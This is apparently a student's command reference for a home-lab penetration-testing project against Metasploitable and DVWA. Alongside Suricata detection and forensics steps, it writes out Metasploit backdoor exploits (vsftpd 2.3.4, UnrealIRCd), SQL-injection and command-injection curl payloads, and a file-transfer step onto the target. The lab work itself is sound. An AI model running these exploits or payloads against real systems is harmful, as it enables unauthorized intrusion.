# ============================================
# RedSentry — Commands Quick Reference
# (Only commands actually used in this project)
# ============================================

# --- Lab startup sequence ---
sudo systemctl start suricata
sudo systemctl status suricata
export TARGET="192.168.128.8"
echo $TARGET   # always verify — this resets in every new terminal session

# --- Suricata rule validation (run after any rule edit) ---
sudo suricata -T -c /etc/suricata/suricata.yaml --no-random

# --- Watch Suricata alerts live (run in a dedicated terminal) ---
sudo tail -f /var/log/suricata/fast.log | grep "REDSENTRY"

# --- Check whether a specific rule fired ---
sudo grep -E "9000007|9000008" /var/log/suricata/fast.log

# --- Restart Suricata after config/rule changes ---
sudo systemctl restart suricata

# ============================================
# Exploitation (Metasploit)
# ============================================

# vsftpd 2.3.4 backdoor
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS $TARGET; run; exit"

# UnrealIRCd backdoor (bind_perl payload — reverse payloads had connectivity
# issues in this environment, bind worked reliably)
msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS $TARGET; set PAYLOAD cmd/unix/bind_perl; run; exit"

# Check active sessions
sessions -l
sessions -i <id>

# ============================================
# Web application testing (DVWA)
# ============================================

# Authenticate and capture session cookie
curl -s -c ~/dvwa_cookies.txt -d "username=admin&password=password&Login=Login" \
  http://$TARGET/dvwa/login.php -o /tmp/login_result.html

# Lower DVWA security level (legitimate DVWA feature, not a bypass)
curl -s -b ~/dvwa_cookies.txt -c ~/dvwa_cookies.txt \
  -d "security=low&seclev_submit=Submit" http://$TARGET/dvwa/security.php

# SQL injection test (payload must match Suricata rule pattern exactly —
# "OR 1=1" literal, not "OR '1'='1'", if testing detection alongside exploit)
curl -s -b ~/dvwa_cookies.txt \
  "http://$TARGET/dvwa/vulnerabilities/sqli/?id=1+OR+1%3D1&Submit=Submit"

# Command injection test (must be sent as POST — DVWA's exec page does not
# accept GET; also note: rule 9000008 only inspects http.uri, so this exploit
# succeeds but will NOT trigger the Suricata rule — a known, documented gap)
curl -s -b ~/dvwa_cookies.txt --data-urlencode "ip=127.0.0.1; whoami" \
  -d "submit=submit" http://$TARGET/dvwa/vulnerabilities/exec/

# ============================================
# Forensics (Autopsy)
# ============================================

# Launch Autopsy (must run with sudo — log-write permissions fail otherwise)
sudo autopsy

# Build a synthetic disk image from collected evidence (no direct memory/disk
# capture was possible from UTM — this packages evidence files into a real
# filesystem for Autopsy to analyse)
dd if=/dev/zero of=~/redsentry/evidence.img bs=1M count=100
mkfs.ext4 ~/redsentry/evidence.img
sudo mount -o loop ~/redsentry/evidence.img /tmp/evidence-mount
sudo cp ~/redsentry/06-forensics/*.txt /tmp/evidence-mount/
sudo umount /tmp/evidence-mount

# ============================================
# Malware analysis (Ghidra + cross-compilation)
# ============================================

# Launch Ghidra
ghidra &

# Compile natively (ARM64 — matches the analysis workstation, NOT the target)
gcc -o redsentry-stub redsentry-stub.c

# Cross-compile attempts made during this project (documented as a full
# troubleshooting chain — see phase04-malware/dynamic-analysis/):
x86_64-linux-gnu-gcc -o redsentry-stub-x86_64 redsentry-stub.c        # wrong kernel bitness
i686-linux-gnu-gcc -m32 -o redsentry-stub-i386 redsentry-stub.c        # glibc version mismatch
i686-linux-gnu-gcc -m32 -static -o redsentry-stub-i386-static redsentry-stub.c  # kernel ABI mismatch

# What actually worked: compile the source directly on the target using its
# own native toolchain (sidesteps every cross-compilation issue at once)
# — run this ON Metasploitable, not on Kali:
gcc -o /tmp/stub /tmp/stub.c

# Dynamic analysis
strace /tmp/stub 2>&1 | tee /tmp/strace-output.txt

# Serve files from Kali to Metasploitable for transfer (simple HTTP, since
# no Meterpreter session was available for upload/download)
python3 -m http.server 8000
# on Metasploitable:
wget http://192.168.128.7:8000/<file> -O /tmp/<file>

# ============================================
# AI reporting
# ============================================

cd ~/redsentry && python3 redsentry-reporter.py

# Verify script syntax before running (cheap check before spending API calls)
python3 -m py_compile ~/redsentry/redsentry-reporter.py

cat ~/redsentry/08-reports/PENTEST-REPORT.md | head -100

# ============================================
# SIEM pipeline check (Kibana/Elasticsearch — used for Phase 02 alert viewing)
# ============================================

sudo systemctl status elasticsearch
sudo systemctl status kibana
curl -I http://localhost:5601      # confirm Kibana is actually serving, not just "running"
sudo journalctl -u kibana -f       # watch Kibana startup if it's slow to come up

# ============================================
# GitHub portfolio
# ============================================

cd ~/redsentry-portfolio
git add .
git status                          # always review before committing
git commit -m "Update"
git push

# Verify no sensitive files were committed
git ls-files | grep -i "shadow\|passwd\|redsentry-stub$"

# ============================================
# Reset Metasploitable to a clean state
# ============================================
# Shut down VM in UTM -> restore baseline snapshot (if one was taken) -> start VM
# Note: no snapshot workflow was established in this session — if resetting
# is needed, take a snapshot NOW before further testing, since this project
# never created one.
